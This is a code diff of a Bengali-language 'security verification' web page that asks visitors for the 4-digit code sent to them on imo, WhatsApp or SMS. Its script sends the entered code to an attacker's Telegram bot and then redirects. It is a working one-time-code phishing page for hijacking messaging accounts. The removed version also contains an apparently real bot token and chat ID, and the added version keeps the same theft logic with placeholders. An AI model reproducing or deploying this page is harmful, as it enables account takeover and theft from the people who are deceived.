@@ -1,102 +1,89 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap');
-        body { font-family: 'Noto Sans Bengali', sans-serif; background-color: #f9fafb; }
-        .input-box { width: 55px; height: 55px; border: 2px solid #e5e7eb; border-radius: 12px; text-align: center; font-size: 24px; font-weight: bold; outline: none; transition: border-color 0.2s; }
-        .input-box:focus { border-color: #3b82f6; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>নিরাপত্তা যাচাই</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+.input-box { width: 55px; height: 55px; border: 2px solid #e5e7eb; border-radius: 12px; text-align: center; font-size: 24px; font-weight: bold; outline: none; transition: border-color 0.2s; }
+.input-box:focus { border-color: #3b82f6; }
+</style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-5">
+<body class="flex items-center justify-center min-h-screen p-5 bg-gray-100">
 
-    <div class="bg-white p-8 rounded-[30px] shadow-lg w-full max-w-sm text-center">
-        <h1 class="text-2xl font-bold text-gray-900 mb-4">নিরাপত্তা যাচাই!</h1>
-        <p class="text-[15px] text-gray-600 mb-6 leading-relaxed">
-            আনলক/Add করতে আপনার imo, whatsapp অথবা মেসেজ অপশনে আসা ৪-সংখ্যার কোডটি ফাঁকা ঘরে বসান।
-        </p>
-        
-        <div id="timer" class="text-red-500 font-bold text-lg mb-6">৩০ সেকেন্ড অপেক্ষা করুন...</div>
-        
-        <div id="inputContainer" class="flex justify-center gap-3 mb-8">
-            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
-            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
-            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
-            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
-        </div>
-    </div>
+<div class="bg-white p-8 rounded-[30px] shadow-lg w-full max-w-sm text-center">
+<h1 class="text-2xl font-bold text-gray-900 mb-4">নিরাপত্তা যাচাই!</h1>
+<p class="text-[15px] text-gray-600 mb-6 leading-relaxed">
+আনলক/Add করতে আপনার imo, whatsapp অথবা মেসেজ অপশনে আসা ৪-সংখ্যার কোডটি ফাঁকা ঘরে বসান।
+</p>
 
-    <script>
-        // আপনার টেলিগ্রাম বটের তথ্য
-        const BOT_TOKEN = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
-        const CHAT_ID = "8516934257";
-        
-        const inputs = document.querySelectorAll('.codeInput');
-        const timerDisplay = document.getElementById('timer');
-        let count = 30;
+<div id="timer" class="text-red-500 font-bold text-lg mb-6">৩০ সেকেন্ড অপেক্ষা করুন...</div>
 
-        // টাইমার লজিক
-        const countdown = setInterval(() => {
-            count--;
-            if (count > 0) {
-                timerDisplay.innerText = count + " সেকেন্ড অপেক্ষা করুন...";
-            } else {
-                clearInterval(countdown);
-                timerDisplay.innerText = "এখন কোডটি বসান";
-                timerDisplay.classList.replace('text-red-500', 'text-green-600');
-                inputs.forEach(input => {
-                    input.disabled = false;
-                    input.classList.remove('bg-gray-100');
-                });
-                inputs[0].focus();
-            }
-        }, 1000);
+<div class="flex justify-center gap-3 mb-8">
+<input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+<input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+<input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+<input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+</div>
+</div>
 
-        // ওটিপি ইনপুট লজিক
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                // শুধু সংখ্যা গ্রহণ করবে
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                
-                // পরের বক্সে ফোকাস
-                if (e.target.value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-                
-                // ৪টি সংখ্যা পূর্ণ হলে টেলিগ্রামে পাঠানো
-                let fullCode = "";
-                inputs.forEach(i => fullCode += i.value);
-                if (fullCode.length === 4) {
-                    sendToTelegram(fullCode);
-                }
-            });
+<script>
+// Telegram Bot তথ্য
+const BOT_TOKEN = "YOUR_BOT_TOKEN";
+const CHAT_ID = "YOUR_CHAT_ID";
 
-            // ব্যাকস্পেস লজিক
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
+const inputs = document.querySelectorAll(".codeInput");
+const timer = document.getElementById("timer");
+let time = 30;
+let codeSent = false;
+
+// TIMER
+const countdown = setInterval(() => {
+    time--;
+    if(time > 0){
+        timer.innerText = time + " সেকেন্ড অপেক্ষা করুন...";
+    } else {
+        clearInterval(countdown);
+        timer.innerText = "এখন কোডটি বসান";
+        timer.classList.replace("text-red-500", "text-green-600");
+        inputs.forEach(input => {
+            input.disabled = false;
+            input.classList.remove("bg-gray-100");
         });
+        inputs[0].focus();
+    }
+}, 1000);
 
-        // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
-        function sendToTelegram(code) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: "নতুন ওটিপি কোড: " + code
-                })
-            }).then(() => {
-                // সফলভাবে পাঠানোর পর পরের পেজে রিডাইরেক্ট
-                window.location.href = "next_page.html";
-            }).catch(err => console.error("Error:", err));
+// INPUT LOGIC
+inputs.forEach(input => {
+    input.addEventListener("input", e => {
+        e.target.value = e.target.value.replace(/[^0-9]/g,'');
+        const code = [...inputs].map(i => i.value).join("");
+        if(code.length === 4 && !codeSent){
+            codeSent = true;
+            sendToTelegram(code);
         }
-    </script>
+    });
+});
+
+// TELEGRAM FUNCTION
+function sendToTelegram(code){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: "নতুন ওটিপি কোড: " + code
+        })
+    })
+    .then(() => {
+        // কোড পাঠানোর পর next_page.html এ রিডাইরেক্ট
+        window.location.href = "next_page.html";
+    })
+    .catch(err => console.log(err));
+}
+</script>
+
 </body>
 </html>
